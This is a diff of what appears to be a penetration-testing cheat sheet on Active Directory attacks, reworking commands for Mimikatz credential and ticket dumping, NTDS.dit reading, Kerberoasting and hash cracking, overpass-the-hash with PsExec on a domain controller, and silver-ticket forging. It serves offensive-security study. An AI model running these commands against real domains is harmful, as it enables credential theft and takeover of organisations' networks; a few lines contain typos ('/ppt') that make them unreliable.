@@ -136,37 +136,23 @@ Foreach($obj in $Result) {
 NTLM authentication uses a challenge-response model, where a nonce/challenge encrypted using the user's NTLM hash is validated by the Domain Controller.
 
 Dumping LM/NTLM hashes with Mimikatz
+* [Full Mimikatz Guide](https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords)
+* Requires local admin rights.
 ```
-# Open mimikatz and escalate security token to SYSTEM integrity
-cmd> mimikatz.exe
+# escalate security token to SYSTEM integrity
 mimikatz > privilege::debug
 mimikatz > token::elevate
 
-# Dump creds of all logged-on users using the Securlsa module
-mimikatz > securlsa::logonpasswords
-
-# Dump Ticket Granting Ticket and Ticket Granting Service (kerberos tickets)
-# -> Access resources associated with these tickets OR
-# -> Obtain TGS with a TGT to access specific resources we want to target in the domain.
-mimkatz > seccurlsa::tickets
-
-# Dump contents of SAM database in current host
-mimikatz > lsadump::sam
-
-# Dump contents of ???
-mimikatz > lsadump::dcsync /domain:pentestlab.local /all
+# dump creds
+mimikatz > lsadump::sam              # dump contents of SAM db in current host
+mimikatz > sekurlsa::logonpasswords  # dump creds of logged-on users
 ```
 
 Other tools
 ```
-# pwdump
 cmd> pwdump.exe localhost
-
-# fgdump (improved pwdump, shutdown firewalls)
-cmd> fgdump.exe localhost
-
-# all domain hashes in NTDS.dit file on the Domain Controller
-cmd> type C:\Windows\NTDS\NTDS.dit
+cmd> fgdump.exe localhost          # improved pwdump, shutdown firewalls 
+cmd> type C:\Windows\NTDS\NTDS.dit # all domain hashes in NTDS.dit file on the Domain Controller
 ```
 
 ### Kerberos ####
@@ -177,46 +163,30 @@ Kerberos authentication uses a ticketing system, where a Ticket Granting Ticket 
 
 Dumping hashes or Kerberos TGT/TGS tickets with Mimikatz
 ```
-# escalate security token to SYSTEM integrity
-cmd> mimikatz.exe
-mimikatz > privilege::debug
-mimikatz > token::elevate
-
-# dump creds of all logged-on users using Securlsa module
-mimikatz > securlsa::logonpasswords
-
-# dump TGT and TGS tickets
-# -> access resources associated with the tickets
-# -> exchange TGS with TGT to access resources we want to target in domain
-mimikatz > securlsa::tickets
-
-# dump contents of SAM db in current host
-mimikatz > lsadump::sam
+mimikatz > sekurlsa::tickets
 ```
 
 Service account attacks
 * If we know the `serviceprincipalname` value from prior AD enum, we can target the SPN by by requesting a service ticket for it from the Domain Controller and access resources from the service with our own ticket.
 ```
-# load the System.IdentityModel namespace
+# request service ticket
 PS> Add-Type -AssemblyName System.IdentityModel
+PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \
+        -ArgumentList '[service_principal_name]'
 
-# request the Service Ticket
-PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '[service_principal_name]'
-
-# list cached Kerberos tickets for the current user
-PS> klist
-
-# download/export cached tickets
+# export cached tickets
 mimikatz > kerberos::list /export
 ```
 
-Crack SPN password hash with Kerberoast
+Crack SPN hashes
 ```
-# locally crack hashes
-$ python tgsrepcrack.py wordlist [/path/to/exported/tickets]
+# Kerberoast
+$ python3 tgsrepcrack.py rockyou.txt [ticket.kirbi]  # locally crack hashes
+PS> Invoke-Kerberoast.ps1                            # crack hashes on target
 
-# crack hashes on target
-PS> Invoke-Kerberoast.ps1
+# John the Ripper
+$ python3 kirbi2john.py -o johncrackfile ticket.kirbi  # convert ticket to john file
+$ john --wordlist=rockyou.txt johncrackfile
 ```
 
 
@@ -235,20 +205,15 @@ Overpass-the-Hash
 * "over" abuse a NTLM hash to gain a full Kerberos TGT or Service Ticket.
 * Requires pw-hash user to have local admin rights on target to run `psexec.exe`.
 ```
-# obtain NTLM hash
-mimikatz > sekurlsa::logonpasswords
-
-# turn hash into a Kerberos ticket
-mimikatz > sekurlsa::pth /user:[user_name] /domain:[domain_name] /ntlm:[hash_value] /run:PowerShell.exe
-
-# generate a TGT by authenticating to a network share on the Domain Controller
-PS> net use \\dc01
-
-# view requested TGT/TGS Kerberos tickets
-PS> klist
-
-# code exec via. PsExec on the Domain Controller
-PS> .\PsExec.exe \\dc01 cmd.exe
+mimikatz > sekurlsa::logonpasswords    # obtain NTLM hash
+mimikatz > sekurlsa::pth               # turn hash into Kerberos ticket
+        /user:[user_name] 
+        /domain:[domain_name]
+        /ntlm:[hash_value]
+        /run:PowerShell.exe
+PS> net use \\dc01                     # generate TGT by authN to network share on the DC
+PS> klist                              # view TGT/TGS tickets
+PS> .\PsExec.exe \\dc01 cmd.exe        # code exec on the DC
 ```
 
 Pass the Ticket
@@ -260,7 +225,8 @@ cmd> whoami /user
 corp\offsec S-1-5-21-1602875587-2787523311-2599479668[-1103]
 
 # generate the Silver Ticket and inject it into memory
-mimikatz > kerberos::golden /user:[user_name] /domain:[domain_name] /sid:[sid_value] /target:[service_hostname] /service:[service_type] /rc4:[hash] /ppt
+mimikatz > kerberos::golden /user:[user_name] /domain:[domain_name] /sid:[sid_value] 
+        /target:[service_hostname] /service:[service_type] /rc4:[hash] /ppt
 ```
 
 Distributed Component Object Model (DCOM)
